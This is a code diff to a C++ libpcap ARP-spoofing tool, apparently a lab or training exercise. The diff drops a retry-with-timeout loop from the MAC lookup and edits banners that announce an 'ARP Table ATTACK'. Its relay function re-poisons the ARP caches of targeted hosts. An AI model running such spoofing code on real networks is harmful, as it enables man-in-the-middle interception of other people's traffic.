@@ -20,8 +20,6 @@
 #include <stdio.h>
 #include <string.h>
 
-#include <atomic>
-#include <condition_variable>
 using namespace std;
 
 std::map<Ip, Mac> mac_cache;
@@ -139,49 +137,33 @@ Mac get_mac_address(pcap_t* handle, const Mac my_mac, const Ip my_ip, const Ip& 
     const Mac& zero = Mac::nullMac();
     make_send_packet(packet_send, my_mac, broadcast, my_mac, my_ip, zero, ip, true);
 
-    const int max_retries = 5;  // Maximum number of retries
-    const int timeout_ms = 1000;  // Timeout for each retry in milliseconds
-
-    for (int attempt = 0; attempt < max_retries; ++attempt) {
-        // Send ARP request packet
-        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
-        if (res != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-        }
-
-        auto start_time = std::chrono::steady_clock::now();
-
-        while (true) {
-            res = pcap_next_ex(handle, &header, &packet_receive);
-            if (res == 0) {
-                // Check for timeout
-                auto elapsed_time = std::chrono::steady_clock::now() - start_time;
-                if (std::chrono::duration_cast<std::chrono::milliseconds>(elapsed_time).count() > timeout_ms) {
-                    break;  // Timeout, retry sending the packet
-                }
-                continue;
-            }
-            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-                break;
-            }
-
-            printf("Capturing to find IP(%s)'s MAC Address\n", static_cast<std::string>(ip).c_str());
-            struct EthArpPacket* EAPacket = (struct EthArpPacket*)packet_receive;
-            if (EAPacket->eth_.type() == EthHdr::Arp
-                && (EAPacket->arp_.op() == ArpHdr::Reply)
-                && (EAPacket->arp_.sip() == ip)) {
-                new_mac_addr = EAPacket->arp_.smac();
-                printf("IP(%s) =>  ", static_cast<std::string>(ip).c_str());
-                printf("%s\n", static_cast<std::string>(new_mac_addr).c_str());
-                //add to mac cache
-                mac_cache[ip] = new_mac_addr;
-                return new_mac_addr;
-            }
-        }
-        printf("Retrying to get MAC address for IP(%s), attempt %d\n", static_cast<std::string>(ip).c_str(), attempt + 1);
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
-    printf("Failed to retrieve MAC address for IP(%s) after %d attempts.\n", static_cast<std::string>(ip).c_str(), max_retries);
+
+    while (true) {
+        res = pcap_next_ex(handle, &header, &packet_receive);
+
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            break;
+        }
+
+        printf("Capturing to find IP(%s)'s MAC Address\n", static_cast<std::string>(ip).c_str());
+        struct EthArpPacket* EAPacket = (struct EthArpPacket*)packet_receive;
+        if (EAPacket->eth_.type() == EthHdr::Arp
+            && (EAPacket->arp_.op() == ArpHdr::Reply)
+            && (EAPacket->arp_.sip() == ip)) {
+            new_mac_addr = EAPacket->arp_.smac();
+            printf("IP(%s) =>  ", static_cast<std::string>(ip).c_str());
+            printf("%s\n", static_cast<std::string>(new_mac_addr).c_str());
+            //add to mac cache
+            mac_cache[ip] = new_mac_addr;
+            return new_mac_addr;
+        }
+    }
+    printf("Failed to retrieve MAC address for IP(%s) \n Please stop and Rety >_<\n", static_cast<std::string>(ip).c_str());
     return new_mac_addr;  // Return the (likely) empty MAC address
 }
 
@@ -224,7 +206,8 @@ void relay_packets(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac
             if (relay_ip_match.find(src_ip) == relay_ip_match.end()
                     || dst_ip != relay_ip_match[src_ip]) continue;
 
-            printf("---------------------ARP Table ATTACK START-------------------\n");
+            printf("------------------ARP Table ATTACK START---------------\n");
+
             printf("| Received ARP packet from %s to %s\n |", std::string(src_ip).c_str(), std::string(dst_ip).c_str());
             EthArpPacket packet_send;
 	
@@ -236,8 +219,8 @@ void relay_packets(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac
             if (res != 0) { 
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle)); 
             }
-            printf("| Attack finished                                 |\n");
-            printf("---------------------------------------------------\n");
+            printf("| Attack finished                                     |\n");
+            printf("-------------------------------------------------------\n");
                 
         } else if (eth_hdr->type() == EthHdr::Ip4) {
             IpHdr* ip_hdr = (IpHdr*)(packet + sizeof(EthHdr));
